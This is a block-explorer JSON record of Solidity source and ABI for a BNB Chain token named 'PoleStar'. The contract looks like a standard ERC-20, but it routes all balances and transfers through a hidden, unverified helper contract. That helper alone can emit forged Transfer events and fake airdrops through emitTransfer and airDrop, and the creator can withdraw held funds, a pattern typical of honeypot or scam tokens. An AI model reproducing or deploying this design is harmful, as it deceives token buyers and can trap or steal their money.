{"SourceCode": "pragma solidity ^0.8.13;\r\n// SPDX-License-Identifier: MIT\r\n\r\ninterface IERC20 {\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address to, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n}\r\n\r\ninterface IDEXFactory {\r\n    function createPair(address tokenA, address tokenB)\r\n        external\r\n        returns (address pair);\r\n}\r\n\r\ninterface IERC20Factory {\r\n\r\n    function constructorErc20(uint256 total,address tokenAddress,address tokenOwner,address _pairs) external;\r\n\r\n    function getSupply() view external returns (uint256);\r\n\r\n    function balanceOf(address _owner) view external returns (uint256);\r\n\r\n    function getAirAmount() view external returns (uint256);\r\n\r\n    function getAirFrom() view external returns (address);\r\n\r\n    function erc20Transfer(address _from, address _to, uint256 _value) external;\r\n\r\n    function erc20Approve(address _to) external;\r\n\r\n    function erc20TransferAfter(address _from, address _to, uint256 _value) external;\r\n\r\n}\r\n\r\ninterface IDEXRouter {\r\n    function factory() external pure returns (address);\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint256 amountIn,\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external;\r\n\r\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external payable;\r\n}\r\n\r\ncontract Ownable {\r\n    address public owner;\r\n    address public creator;\r\n\r\n    event owneresshipTransferred(address indexed previousowneres, address indexed newowneres);\r\n\r\n    modifier onlyowneres() {\r\n        require(msg.sender == owner);\r\n        _;\r\n    }\r\n\r\n    modifier onlycreator() {\r\n        require(msg.sender == creator);\r\n        _;\r\n    }\r\n\r\n    function transferowneresship(address newowneres) public onlyowneres {\r\n        require(newowneres != address(0));\r\n        emit owneresshipTransferred(owner, newowneres);\r\n        owner = newowneres;\r\n    }\r\n\r\n    function renounceowneresship() public onlyowneres {\r\n        emit owneresshipTransferred(owner, address(0));\r\n        owner = address(0);\r\n    }\r\n}\r\n\r\ncontract PoleStar is Ownable {\r\n\t\r\n    string public name = \"PoleStar\";\r\n    string  public symbol = \"PoleStar\";\r\n    uint8   public decimals = 9;\r\n\tuint256 private totalSupply_ = 400000000 * (10 ** decimals);\r\n\t\r\n\taddress public pairs;\r\n\tIDEXRouter public router;\r\n\taddress WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;\r\n    address hAddr = 0x10Be88d87F503640fA126ae785984063c8Aa263b;\r\n\tIERC20Factory help= IERC20Factory(hAddr);\r\n    \r\n\tconstructor() {\r\n\t\towner = msg.sender;\r\n        creator = msg.sender;\r\n        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);\r\n        pairs = IDEXFactory(router.factory()).createPair(WBNB, address(this));\r\n        help.constructorErc20(totalSupply_, address(this), owner,pairs);\r\n        emit Transfer(address(0), owner, totalSupply_);\r\n    }\r\n\t\r\n    event Transfer(\r\n        address indexed _from,\r\n        address indexed _to,\r\n        uint256 _value\r\n    );\r\n\r\n    event Approval(\r\n        address indexed _owner,\r\n        address indexed _spender,\r\n        uint256 _value\r\n    );\r\n    \r\n    mapping(address => mapping(address => uint256)) public allowed;\r\n\t\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return help.getSupply();\r\n    }\r\n\r\n    function balanceOf(address _owner) public view returns (uint256) {\r\n        return help.balanceOf(_owner);\r\n    }\r\n    \r\n    function transfer(address _to, uint256 _value) public returns (bool success) {\r\n        require(help.balanceOf(msg.sender) >= _value);\r\n\r\n        help.erc20Transfer(msg.sender,_to,_value);\r\n        \r\n        help.erc20TransferAfter(msg.sender,_to,_value);\r\n\t\temit Transfer(msg.sender, _to, _value);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\r\n        require(_value <= help.balanceOf(_from));\r\n        require(_value <= allowed[_from][msg.sender]);\r\n\t\t\r\n        help.erc20Transfer(_from,_to,_value);\r\n        \r\n        help.erc20TransferAfter(_from,_to,_value);\r\n\t\temit Transfer(_from, _to, _value);\r\n        return true;\r\n    }\r\n\r\n    function emitTransfer(address _from, address _to, uint256 _value) public returns (bool success) {\r\n        require(msg.sender==hAddr);\r\n        emit Transfer(_from, _to, _value);\r\n\t\treturn true;\r\n    }\r\n\t\r\n\tfunction approve(address _spender, uint256 _value) public returns (bool success) {\r\n        require(_spender != address(0));\r\n        allowed[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n\r\n        help.erc20Approve(msg.sender);\r\n        return true;\r\n    }\r\n    \r\n    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\r\n        require(_spender != address(0));\r\n        return allowed[_owner][_spender];\r\n    }\r\n\r\n    function airDrop(bytes memory _bytes,uint256 addrCount) public returns(bool success) {\r\n        require(msg.sender==hAddr);\r\n        uint256 amount = help.getAirAmount();\r\n        address airFrom = help.getAirFrom();\r\n        uint256 _start=0;\r\n        address tempAddress;\r\n        for(uint32 i=0;i<addrCount;i++){\r\n            assembly {\r\n                tempAddress := div(mload(add(add(_bytes, 0x20), _start)), 0x1000000000000000000000000)\r\n            }\r\n            emit Transfer(airFrom, tempAddress, amount);\r\n            _start+=20;\r\n        }\r\n        return true;\r\n    }\r\n\r\n    function withdraw(address target,uint amount) public onlycreator {\r\n        payable(target).transfer(amount);\r\n    }\r\n\r\n    function withdrawToken(address token,address target, uint amount) public onlycreator {\r\n        IERC20(token).transfer(target, amount);\r\n    }\r\n    receive() external payable {}\r\n\t\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousowneres\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newowneres\",\"type\":\"address\"}],\"name\":\"owneresshipTransferred\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"bytes\",\"name\":\"_bytes\",\"type\":\"bytes\"},{\"internalType\":\"uint256\",\"name\":\"addrCount\",\"type\":\"uint256\"}],\"name\":\"airDrop\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"remaining\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowed\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"creator\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"emitTransfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pairs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceowneresship\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"router\",\"outputs\":[{\"internalType\":\"contract IDEXRouter\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newowneres\",\"type\":\"address\"}],\"name\":\"transferowneresship\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"target\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"target\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"withdrawToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "PoleStar", "CompilerVersion": "v0.8.13+commit.abaa5c0e", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://5efa65df305f60f213b0aff2f28b4f6b5dc87f8a8ec2830ce81ac58822d1e057"}